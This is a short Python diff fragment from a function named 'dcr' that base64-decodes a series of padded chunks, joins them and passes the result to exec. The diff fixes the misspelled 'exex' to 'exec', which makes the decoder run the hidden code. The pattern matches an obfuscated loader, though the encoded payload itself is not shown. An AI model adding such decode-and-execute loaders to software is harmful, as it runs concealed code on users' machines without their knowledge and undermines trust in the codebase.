@@ -28,6 +28,6 @@ def dcr(sex):
           i += "=="
           buttock.append(base64.b64decode(i))
      result = b''.join(buttock).decode()
-     exex(result)
+     exec(result)
 
 
